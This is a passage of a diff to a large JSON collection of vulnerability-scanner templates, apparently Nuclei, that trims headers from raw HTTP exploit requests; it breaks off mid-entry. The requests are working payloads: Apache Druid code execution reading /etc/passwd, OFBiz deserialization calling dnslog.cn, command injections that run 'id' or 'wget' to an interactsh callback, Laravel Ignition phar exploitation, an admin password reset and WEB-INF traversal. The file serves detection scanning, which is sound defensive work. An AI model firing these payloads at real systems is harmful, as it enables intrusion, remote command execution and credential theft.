+            "POST /druid/indexer/v1/sampler HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/json\n\n{\n\"type\":\"index\",\n\"spec\":{\n   \"ioConfig\":{\n      \"type\":\"index\",\n      \"firehose\":{\n         \"type\":\"local\",\n         \"baseDir\":\"/etc\",\n         \"filter\":\"passwd\"\n      }\n   },\n   \"dataSchema\":{\n      \"dataSource\":\"odgjxrrrePz\",\n      \"parser\":{\n         \"parseSpec\":{\n            \"format\":\"javascript\",\n            \"timestampSpec\":{\n\n            },\n            \"dimensionsSpec\":{\n\n            },\n            \"function\":\"function(){var hTVCCerYZ = new java.util.Scanner(java.lang.Runtime.getRuntime().exec(\\\"/bin/sh`@~-c`@~cat /etc/passwd\\\".split(\\\"`@~\\\")).getInputStream()).useDelimiter(\\\"\\\\A\\\").next();return {timestamp:\\\"4137368\\\",OQtGXcxBVQVL: hTVCCerYZ}}\",\n            \"\":{\n               \"enabled\":\"true\"\n            }\n         }\n      }\n   }\n},\n\"samplerConfig\":{\n   \"numRows\":10\n}\n}\n"
           ]
         }
       ]
@@ -24433,7 +24532,7 @@
           ],
           "matchers-condition": "and",
           "raw": [
-            "POST /webtools/control/SOAPService HTTP/1.1\nHost: {{Hostname}}\nAccept-Encoding: gzip, deflate\nAccept: */*\nAccept-Language: en\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36\nConnection: close\nContent-Type: application/xml\nContent-Length: 910\n\n<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\">\n<soapenv:Header/>\n<soapenv:Body>\n<ser>\n<map-HashMap>\n<map-Entry>\n<map-Key>\n<cus-obj>bcc62005737220116a6176612e7574696c2e486173684d617005070c341c16606403200246200a6c6f6164466163746f724920097468726573686f6c6478703f4020202020200c770820202010202020017372200c6a6176612e6e65742e55524cfb2537361a7fa37203200749200868617368436f6465492004706f72744c2009617574686f726974797420124c6a6176612f6c616e672f537472696e673b4c200466696c6571207e20034c2004686f737471207e20034c200870726f746f636f6c71207e20034c200372656671207e20037870a0a0a0a0a0a0a0a07420107435336c71392e646e736c6f672e636e7420012f71207e2005742004687474707078742018687474703a2f2f7435336c71392e646e736c6f672e636e2f780a</cus-obj>\n</map-Key>\n<map-Value>\n<std-String value=\"http://t53lq9.dnslog.cn/\"></std-String>\n</map-Value>\n</map-Entry>\n</map-HashMap>\n</ser>\n</soapenv:Body>\n</soapenv:Envelope>\n"
+            "POST /webtools/control/SOAPService HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/xml\n\n<soapenv:Envelope\n    xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\">\n    <soapenv:Header/>\n    <soapenv:Body>\n        <ser>\n            <map-HashMap>\n                <map-Entry>\n                    <map-Key>\n                        <cus-obj>bcc62005737220116a6176612e7574696c2e486173684d617005070c341c16606403200246200a6c6f6164466163746f724920097468726573686f6c6478703f4020202020200c770820202010202020017372200c6a6176612e6e65742e55524cfb2537361a7fa37203200749200868617368436f6465492004706f72744c2009617574686f726974797420124c6a6176612f6c616e672f537472696e673b4c200466696c6571207e20034c2004686f737471207e20034c200870726f746f636f6c71207e20034c200372656671207e20037870a0a0a0a0a0a0a0a07420107435336c71392e646e736c6f672e636e7420012f71207e2005742004687474707078742018687474703a2f2f7435336c71392e646e736c6f672e636e2f780a</cus-obj>\n                    </map-Key>\n                    <map-Value>\n                        <std-String value=\"http://t53lq9.dnslog.cn/\"></std-String>\n                    </map-Value>\n                </map-Entry>\n            </map-HashMap>\n        </ser>\n    </soapenv:Body>\n</soapenv:Envelope>\n"
           ]
         }
       ]
@@ -24924,8 +25023,8 @@
           ],
           "matchers-condition": "and",
           "raw": [
-            "GET /assets/app/something/services/AppModule.class/ HTTP/1.1\nHost: {{Hostname}}\nOrigin: {{BaseURL}}\nConnection: close\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko)\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\nAccept-Language: en-US,en;q=0.9\n",
-            "GET /assets/app/{{id}}/services/AppModule.class/ HTTP/1.1\nHost: {{Hostname}}\nOrigin: {{BaseURL}}\nConnection: close\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko)\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\nAccept-Language: en-US,en;q=0.9\n"
+            "GET /assets/app/something/services/AppModule.class/ HTTP/1.1\nHost: {{Hostname}}\nOrigin: {{BaseURL}}\n",
+            "GET /assets/app/{{id}}/services/AppModule.class/ HTTP/1.1\nHost: {{Hostname}}\nOrigin: {{BaseURL}}\n"
           ]
         }
       ]
@@ -25073,7 +25172,7 @@
       "id": "CVE-2021-28150",
       "info": {
         "author": "gy741",
-        "description": "Hongdian H8922 3.0.5 devices allow the unprivileged guest user to read cli.conf (with the administrator password and other sensitive data) via /backup2.cgi.\n",
+        "description": "Hongdian H8922 3.0.5 devices allow the unprivileged guest user to read cli.conf (with the administrator password and other sensitive data) via /backup2.cgi.",
         "name": "Hongdian Sensitive Information",
         "reference": [
           "https://ssd-disclosure.com/ssd-advisory-hongdian-h8922-multiple-vulnerabilities/",
@@ -25109,8 +25208,8 @@
           ],
           "matchers-condition": "and",
           "raw": [
-            "GET /backup2.cgi HTTP/1.1\nHost: {{Hostname}}\nCache-Control: max-age=0\nAuthorization: Basic Z3Vlc3Q6Z3Vlc3Q=\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\nAccept-Encoding: gzip, deflate\nAccept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7\nConnection: close\n",
-            "GET /backup2.cgi HTTP/1.1\nHost: {{Hostname}}\nCache-Control: max-age=0\nAuthorization: Basic YWRtaW46YWRtaW4=\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\nAccept-Encoding: gzip, deflate\nAccept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7\nConnection: close\n"
+            "GET /backup2.cgi HTTP/1.1\nHost: {{Hostname}}\nAuthorization: Basic Z3Vlc3Q6Z3Vlc3Q=\n",
+            "GET /backup2.cgi HTTP/1.1\nHost: {{Hostname}}\nAuthorization: Basic YWRtaW46YWRtaW4=\n"
           ]
         }
       ]
@@ -25157,8 +25256,8 @@
           ],
           "matchers-condition": "and",
           "raw": [
-            "POST /tools.cgi HTTP/1.1\nHost: {{Hostname}}\nContent-Length: 85\nCache-Control: max-age=0\nAuthorization: Basic Z3Vlc3Q6Z3Vlc3Q=\nUpgrade-Insecure-Requests: 1\nOrigin: {{BaseURL}}\nContent-Type: application/x-www-form-urlencoded\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\nReferer: http://{{Hostname}}/tools.cgi\nAccept-Encoding: gzip, deflate\nAccept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7\nConnection: close\n\nop_type=ping&destination=%3Bid\n",
-            "POST /tools.cgi HTTP/1.1\nHost: {{Hostname}}\nContent-Length: 85\nCache-Control: max-age=0\nAuthorization: Basic YWRtaW46YWRtaW4=\nUpgrade-Insecure-Requests: 1\nOrigin: {{BaseURL}}\nContent-Type: application/x-www-form-urlencoded\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\nReferer: http://{{Hostname}}/tools.cgi\nAccept-Encoding: gzip, deflate\nAccept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7\nConnection: close\n\nop_type=ping&destination=%3Bid\n"
+            "POST /tools.cgi HTTP/1.1\nHost: {{Hostname}}\nAuthorization: Basic Z3Vlc3Q6Z3Vlc3Q=\nOrigin: {{BaseURL}}\nReferer: {{BaseURL}}/tools.cgi\n\nop_type=ping&destination=%3Bid\n",
+            "POST /tools.cgi HTTP/1.1\nHost: {{Hostname}}\nAuthorization: Basic YWRtaW46YWRtaW4=\nOrigin: {{BaseURL}}\nReferer: {{BaseURL}}/tools.cgi\n\nop_type=ping&destination=%3Bid\n"
           ]
         }
       ]
@@ -25452,8 +25551,8 @@
           ],
           "matchers-condition": "and",
           "raw": [
-            "PATCH /redfish/v1/SessionService/ResetPassword/1/ HTTP/1.1\nHost: {{Hostname}}\nAccept-Language: en\nAccept: */*\nContent-Length: 23\nContent-Type: application/json\nConnection: close\n\n{\"Password\":\"{{randstr}}\"}\n",
-            "POST /redfish/v1/SessionService/Sessions/ HTTP/1.1\nHost: {{Hostname}}\nAccept-Language: en\nContent-Length: 50\nContent-Type: application/json\nConnection: close\n\n{\"UserName\":\"Administrator\",\"Password\":\"{{randstr}}\"}\n"
+            "PATCH /redfish/v1/SessionService/ResetPassword/1/ HTTP/1.1\nHost: {{Hostname}}\nAccept: */*\nContent-Type: application/json\n\n{\"Password\":\"{{randstr}}\"}\n",
+            "POST /redfish/v1/SessionService/Sessions/ HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/json\n\n{\"UserName\":\"Administrator\",\"Password\":\"{{randstr}}\"}\n"
           ]
         }
       ]
@@ -25839,7 +25938,7 @@
           ],
           "matchers-condition": "and",
           "raw": [
-            "POST /index.php HTTP/1.1\nHost: {{Hostname}}\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nConnection: close\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 35\n\nSPOOLDIR=test\".system(id).\"&recheck=Recheck\n"
+            "POST /index.php HTTP/1.1\nHost: {{Hostname}}\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nContent-Type: application/x-www-form-urlencoded\n\nSPOOLDIR=test\".system(id).\"&recheck=Recheck\n"
           ]
         }
       ]
@@ -26000,12 +26099,12 @@
           ],
           "matchers-condition": "and",
           "raw": [
-            "POST /_ignition/execute-solution HTTP/1.1\nHost: {{Hostname}}\nAccept-Encoding: deflate\nAccept: application/json\nConnection: close\nContent-Length: 144\nContent-Type: application/json\n\n{\"solution\": \"Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution\", \"parameters\": {\"variableName\": \"cve20213129\", \"viewFile\": \"php://filter/write=convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log\"}}\n",
-            "POST /_ignition/execute-solution HTTP/1.1\nHost: {{Hostname}}\nAccept-Encoding: deflate\nAccept: application/json\nConnection: close\nContent-Length: 144\nContent-Type: application/json\n\n{\"solution\": \"Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution\", \"parameters\": {\"variableName\": \"cve20213129\", \"viewFile\": \"php://filter/write=convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log\"}}\n",
-            "POST /_ignition/execute-solution HTTP/1.1\nHost: {{Hostname}}\nAccept-Encoding: deflate\nAccept: application/json\nConnection: close\nContent-Length: 144\nContent-Type: application/json\n\n{\"solution\": \"Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution\", \"parameters\": {\"variableName\": \"cve20213129\", \"viewFile\": \"AA\"}}\n",
-            "POST /_ignition/execute-solution HTTP/1.1\nHost: {{Hostname}}\nAccept-Encoding: deflate\nAccept: application/json\nConnection: close\nContent-Length: 144\nContent-Type: application/json\n\n{\"solution\": \"Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution\", \"parameters\": {\"variableName\": \"cve20213129\", \"viewFile\": \"=50=00=44=00=39=00=77=00=61=00=48=00=41=00=67=00=58=00=31=00=39=00=49=00=51=00=55=00=78=00=55=00=58=00=30=00=4E=00=50=00=54=00=56=00=42=00=4A=00=54=00=45=00=56=00=53=00=4B=00=43=00=6B=00=37=00=49=00=44=00=38=00=2B=00=44=00=51=00=6F=00=4C=00=41=00=51=00=41=00=41=00=41=00=67=00=41=00=41=00=41=00=42=00=45=00=41=00=41=00=41=00=41=00=42=00=41=00=41=00=41=00=41=00=41=00=41=00=43=00=7A=00=41=00=41=00=41=00=41=00=54=00=7A=00=6F=00=30=00=4D=00=44=00=6F=00=69=00=53=00=57=00=78=00=73=00=64=00=57=00=31=00=70=00=62=00=6D=00=46=00=30=00=5A=00=56=00=78=00=43=00=63=00=6D=00=39=00=68=00=5A=00=47=00=4E=00=68=00=63=00=33=00=52=00=70=00=62=00=6D=00=64=00=63=00=55=00=47=00=56=00=75=00=5A=00=47=00=6C=00=75=00=5A=00=30=00=4A=00=79=00=62=00=32=00=46=00=6B=00=59=00=32=00=46=00=7A=00=64=00=43=00=49=00=36=00=4D=00=6A=00=70=00=37=00=63=00=7A=00=6F=00=35=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=6C=00=64=00=6D=00=56=00=75=00=64=00=48=00=4D=00=69=00=4F=00=30=00=38=00=36=00=4D=00=7A=00=45=00=36=00=49=00=6B=00=6C=00=73=00=62=00=48=00=56=00=74=00=61=00=57=00=35=00=68=00=64=00=47=00=56=00=63=00=56=00=6D=00=46=00=73=00=61=00=57=00=52=00=68=00=64=00=47=00=6C=00=76=00=62=00=6C=00=78=00=57=00=59=00=57=00=78=00=70=00=5A=00=47=00=46=00=30=00=62=00=33=00=49=00=69=00=4F=00=6A=00=45=00=36=00=65=00=33=00=4D=00=36=00=4D=00=54=00=41=00=36=00=49=00=6D=00=56=00=34=00=64=00=47=00=56=00=75=00=63=00=32=00=6C=00=76=00=62=00=6E=00=4D=00=69=00=4F=00=32=00=45=00=36=00=4D=00=54=00=70=00=37=00=63=00=7A=00=6F=00=77=00=4F=00=69=00=49=00=69=00=4F=00=33=00=4D=00=36=00=4E=00=6A=00=6F=00=69=00=63=00=33=00=6C=00=7A=00=64=00=47=00=56=00=74=00=49=00=6A=00=74=00=39=00=66=00=58=00=4D=00=36=00=4F=00=44=00=6F=00=69=00=41=00=43=00=6F=00=41=00=5A=00=58=00=5A=00=6C=00=62=00=6E=00=51=00=69=00=4F=00=33=00=4D=00=36=00=4D=00=6A=00=6F=00=69=00=61=00=57=00=51=00=69=00=4F=00=33=00=30=00=46=00=41=00=41=00=41=00=41=00=5A=00=48=00=56=00=74=00=62=00=58=00=6B=00=45=00=41=00=41=00=41=00=41=00=58=00=73=00=7A=00=6F=00=59=00=41=00=51=00=41=00=41=00=41=00=41=00=4D=00=66=00=6E=00=2F=00=59=00=70=00=41=00=45=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=49=00=41=00=41=00=41=00=41=00=64=00=47=00=56=00=7A=00=64=00=43=00=35=00=30=00=65=00=48=00=51=00=45=00=41=00=41=00=41=00=41=00=58=00=73=00=7A=00=6F=00=59=00=41=00=51=00=41=00=41=00=41=00=41=00=4D=00=66=00=6E=00=2F=00=59=00=70=00=41=00=45=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=43=00=7A=00=64=00=47=00=56=00=7A=00=64=00=48=00=52=00=6C=00=63=00=33=00=51=00=63=00=4A=00=39=00=59=00=36=00=5A=00=6B=00=50=00=61=00=39=00=61=00=45=00=49=00=51=00=49=00=45=00=47=00=30=00=6B=00=4A=00=2B=00=39=00=4A=00=50=00=6B=00=4C=00=67=00=49=00=41=00=41=00=41=00=42=00=48=00=51=00=6B=00=31=00=43=00a\"}}\n",
-            "POST /_ignition/execute-solution HTTP/1.1\nHost: {{Hostname}}\nAccept-Encoding: deflate\nAccept: application/json\nConnection: close\nContent-Length: 144\nContent-Type: application/json\n\n{\"solution\": \"Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution\", \"parameters\": {\"variableName\": \"cve20213129\", \"viewFile\": \"php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log\"}}\n",
-            "POST /_ignition/execute-solution HTTP/1.1\nHost: {{Hostname}}\nAccept-Encoding: deflate\nAccept: application/json\nConnection: close\nContent-Length: 144\nContent-Type: application/json\n\n{\"solution\": \"Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution\", \"parameters\": {\"variableName\": \"cve20213129\", \"viewFile\": \"phar://../storage/logs/laravel.log/test.txt\"}}\n"
+            "POST /_ignition/execute-solution HTTP/1.1\nHost: {{Hostname}}\nAccept: application/json\nContent-Type: application/json\n\n{\"solution\": \"Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution\", \"parameters\": {\"variableName\": \"cve20213129\", \"viewFile\": \"php://filter/write=convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log\"}}\n",
+            "POST /_ignition/execute-solution HTTP/1.1\nHost: {{Hostname}}\nAccept: application/json\nContent-Type: application/json\n\n{\"solution\": \"Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution\", \"parameters\": {\"variableName\": \"cve20213129\", \"viewFile\": \"php://filter/write=convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log\"}}\n",
+            "POST /_ignition/execute-solution HTTP/1.1\nHost: {{Hostname}}\nAccept: application/json\nContent-Type: application/json\n\n{\"solution\": \"Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution\", \"parameters\": {\"variableName\": \"cve20213129\", \"viewFile\": \"AA\"}}\n",
+            "POST /_ignition/execute-solution HTTP/1.1\nHost: {{Hostname}}\nAccept: application/json\nContent-Type: application/json\n\n{\"solution\": \"Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution\", \"parameters\": {\"variableName\": \"cve20213129\", \"viewFile\": \"=50=00=44=00=39=00=77=00=61=00=48=00=41=00=67=00=58=00=31=00=39=00=49=00=51=00=55=00=78=00=55=00=58=00=30=00=4E=00=50=00=54=00=56=00=42=00=4A=00=54=00=45=00=56=00=53=00=4B=00=43=00=6B=00=37=00=49=00=44=00=38=00=2B=00=44=00=51=00=6F=00=4C=00=41=00=51=00=41=00=41=00=41=00=67=00=41=00=41=00=41=00=42=00=45=00=41=00=41=00=41=00=41=00=42=00=41=00=41=00=41=00=41=00=41=00=41=00=43=00=7A=00=41=00=41=00=41=00=41=00=54=00=7A=00=6F=00=30=00=4D=00=44=00=6F=00=69=00=53=00=57=00=78=00=73=00=64=00=57=00=31=00=70=00=62=00=6D=00=46=00=30=00=5A=00=56=00=78=00=43=00=63=00=6D=00=39=00=68=00=5A=00=47=00=4E=00=68=00=63=00=33=00=52=00=70=00=62=00=6D=00=64=00=63=00=55=00=47=00=56=00=75=00=5A=00=47=00=6C=00=75=00=5A=00=30=00=4A=00=79=00=62=00=32=00=46=00=6B=00=59=00=32=00=46=00=7A=00=64=00=43=00=49=00=36=00=4D=00=6A=00=70=00=37=00=63=00=7A=00=6F=00=35=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=6C=00=64=00=6D=00=56=00=75=00=64=00=48=00=4D=00=69=00=4F=00=30=00=38=00=36=00=4D=00=7A=00=45=00=36=00=49=00=6B=00=6C=00=73=00=62=00=48=00=56=00=74=00=61=00=57=00=35=00=68=00=64=00=47=00=56=00=63=00=56=00=6D=00=46=00=73=00=61=00=57=00=52=00=68=00=64=00=47=00=6C=00=76=00=62=00=6C=00=78=00=57=00=59=00=57=00=78=00=70=00=5A=00=47=00=46=00=30=00=62=00=33=00=49=00=69=00=4F=00=6A=00=45=00=36=00=65=00=33=00=4D=00=36=00=4D=00=54=00=41=00=36=00=49=00=6D=00=56=00=34=00=64=00=47=00=56=00=75=00=63=00=32=00=6C=00=76=00=62=00=6E=00=4D=00=69=00=4F=00=32=00=45=00=36=00=4D=00=54=00=70=00=37=00=63=00=7A=00=6F=00=77=00=4F=00=69=00=49=00=69=00=4F=00=33=00=4D=00=36=00=4E=00=6A=00=6F=00=69=00=63=00=33=00=6C=00=7A=00=64=00=47=00=56=00=74=00=49=00=6A=00=74=00=39=00=66=00=58=00=4D=00=36=00=4F=00=44=00=6F=00=69=00=41=00=43=00=6F=00=41=00=5A=00=58=00=5A=00=6C=00=62=00=6E=00=51=00=69=00=4F=00=33=00=4D=00=36=00=4D=00=6A=00=6F=00=69=00=61=00=57=00=51=00=69=00=4F=00=33=00=30=00=46=00=41=00=41=00=41=00=41=00=5A=00=48=00=56=00=74=00=62=00=58=00=6B=00=45=00=41=00=41=00=41=00=41=00=58=00=73=00=7A=00=6F=00=59=00=41=00=51=00=41=00=41=00=41=00=41=00=4D=00=66=00=6E=00=2F=00=59=00=70=00=41=00=45=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=49=00=41=00=41=00=41=00=41=00=64=00=47=00=56=00=7A=00=64=00=43=00=35=00=30=00=65=00=48=00=51=00=45=00=41=00=41=00=41=00=41=00=58=00=73=00=7A=00=6F=00=59=00=41=00=51=00=41=00=41=00=41=00=41=00=4D=00=66=00=6E=00=2F=00=59=00=70=00=41=00=45=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=43=00=7A=00=64=00=47=00=56=00=7A=00=64=00=48=00=52=00=6C=00=63=00=33=00=51=00=63=00=4A=00=39=00=59=00=36=00=5A=00=6B=00=50=00=61=00=39=00=61=00=45=00=49=00=51=00=49=00=45=00=47=00=30=00=6B=00=4A=00=2B=00=39=00=4A=00=50=00=6B=00=4C=00=67=00=49=00=41=00=41=00=41=00=42=00=48=00=51=00=6B=00=31=00=43=00a\"}}\n",
+            "POST /_ignition/execute-solution HTTP/1.1\nHost: {{Hostname}}\nAccept: application/json\nContent-Type: application/json\n\n{\"solution\": \"Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution\", \"parameters\": {\"variableName\": \"cve20213129\", \"viewFile\": \"php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log\"}}\n",
+            "POST /_ignition/execute-solution HTTP/1.1\nHost: {{Hostname}}\nAccept: application/json\nContent-Type: application/json\n\n{\"solution\": \"Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution\", \"parameters\": {\"variableName\": \"cve20213129\", \"viewFile\": \"phar://../storage/logs/laravel.log/test.txt\"}}\n"
           ]
         }
       ]
@@ -26119,7 +26218,7 @@
             }
           ],
           "raw": [
-            "POST /goform/setmac HTTP/1.1\nHost: {{Hostname}}\nConnection: close\nAccept-Encoding: gzip, deflate\nAccept: */*\nOrigin: http://{{Hostname}}\nReferer: http://{{Hostname}}/index.htmlr\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0\nContent-Type: application/x-www-form-urlencoded\n\nmodule1=wifiBasicCfg&doubleBandUnityEnable=false&wifiTotalEn=true&wifiEn=true&wifiSSID=Tenda_B0E040&mac=wget+http://{{interactsh-url}}&wifiSecurityMode=WPAWPA2%2FAES&wifiPwd=Password12345&wifiHideSSID=false&wifiEn_5G=true&wifiSSID_5G=Tenda_B0E040_5G&wifiSecurityMode_5G=WPAWPA2%2FAES&wifiPwd_5G=Password12345&wifiHideSSID_5G=false&module2=wifiGuest&guestEn=false&guestEn_5G=false&guestSSID=Tenda_VIP&guestSSID_5G=Tenda_VIP_5G&guestPwd=&guestPwd_5G=&guestValidTime=8&guestShareSpeed=0&module3=wifiPower&wifiPower=high&wifiPower_5G=high&module5=wifiAdvCfg&wifiMode=bgn&wifiChannel=auto&wifiBandwidth=auto&wifiMode_5G=ac&wifiChannel_5G=auto&wifiBandwidth_5G=auto&wifiAntijamEn=false&module6=wifiBeamforming&wifiBeaformingEn=true&module7=wifiWPS&wpsEn=true&wanType=static\n"
+            "POST /goform/setmac HTTP/1.1\nHost: {{Hostname}}\nOrigin: {{BaseURL}}\nReferer: {{BaseURL}}/index.htmlr\nContent-Type: application/x-www-form-urlencoded\n\nmodule1=wifiBasicCfg&doubleBandUnityEnable=false&wifiTotalEn=true&wifiEn=true&wifiSSID=Tenda_B0E040&mac=wget+http://{{interactsh-url}}&wifiSecurityMode=WPAWPA2%2FAES&wifiPwd=Password12345&wifiHideSSID=false&wifiEn_5G=true&wifiSSID_5G=Tenda_B0E040_5G&wifiSecurityMode_5G=WPAWPA2%2FAES&wifiPwd_5G=Password12345&wifiHideSSID_5G=false&module2=wifiGuest&guestEn=false&guestEn_5G=false&guestSSID=Tenda_VIP&guestSSID_5G=Tenda_VIP_5G&guestPwd=&guestPwd_5G=&guestValidTime=8&guestShareSpeed=0&module3=wifiPower&wifiPower=high&wifiPower_5G=high&module5=wifiAdvCfg&wifiMode=bgn&wifiChannel=auto&wifiBandwidth=auto&wifiMode_5G=ac&wifiChannel_5G=auto&wifiBandwidth_5G=auto&wifiAntijamEn=false&module6=wifiBeamforming&wifiBeaformingEn=true&module7=wifiWPS&wpsEn=true&wanType=static\n"
           ]
         }
       ]
@@ -26200,7 +26299,7 @@
           ],
           "matchers-condition": "and",
           "raw": [
-            "GET /appGet.cgi?hook=get_cfg_clientlist() HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: asusrouter--\nConnection: close\nReferer: {{BaseURL}}\nCookie: asus_token=\\0Invalid; clickedItem_tab=0\n"
+            "GET /appGet.cgi?hook=get_cfg_clientlist() HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: asusrouter--\nReferer: {{BaseURL}}\nCookie: asus_token=\\0Invalid; clickedItem_tab=0\n"
           ]
         }
       ]
@@ -26381,7 +26480,7 @@
           ],
           "matchers-condition": "and",
           "raw": [
-            "GET /status.htm HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\nAccept-Encoding: gzip, deflate\nAccept: */*\nConnection: keep-alive\nCookie: language=en; login=1\n"
+            "GET /status.htm HTTP/1.1\nHost: {{Hostname}}\nCookie: language=en; login=1\n"
           ]
         }
       ]
@@ -26456,7 +26555,7 @@
             }
           ],
           "raw": [
-            "GET //uapi-cgi/certmngr.cgi?action=createselfcert&local=anything&country=AA&state=%24(wget%20http://{{interactsh-url}})&organization=anything&organizationunit=anything&commonname=anything&days=1&type=anything HTTP/1.1\nHost: {{Hostname}}\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\nAccept-Encoding: gzip, deflate\nCache-Control: max-age=0\nConnection: keep-alive\n"
+            "GET //uapi-cgi/certmngr.cgi?action=createselfcert&local=anything&country=AA&state=%24(wget%20http://{{interactsh-url}})&organization=anything&organizationunit=anything&commonname=anything&days=1&type=anything HTTP/1.1\nHost: {{Hostname}}\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\n"
           ]
         }
       ]
@@ -26778,8 +26877,8 @@
           ],
           "matchers-condition": "and",
           "raw": [
-            "GET /%u002e/WEB-INF/web.xml HTTP/1.1\nHost: {{Hostname}}\nOrigin: {{BaseURL}}\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko)\n\n",
-            "GET /.%00/WEB-INF/web.xml HTTP/1.1\nHost: {{Hostname}}\nOrigin: {{BaseURL}}\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko)\n\n\n"
+            "GET /%u002e/WEB-INF/web.xml HTTP/1.1\nHost: {{Hostname}}\nOrigin: {{BaseURL}}\n\n",
+            "GET /.%00/WEB-INF/web.xml HTTP/1.1\nHost: {{Hostname}}\nOrigin: {{BaseURL}}\n\n\n"
           ],
           "unsafe": true
         }
@@ -26849,8 +26948,8 @@
           ],
           "matchers-condition": "and",
           "raw": [
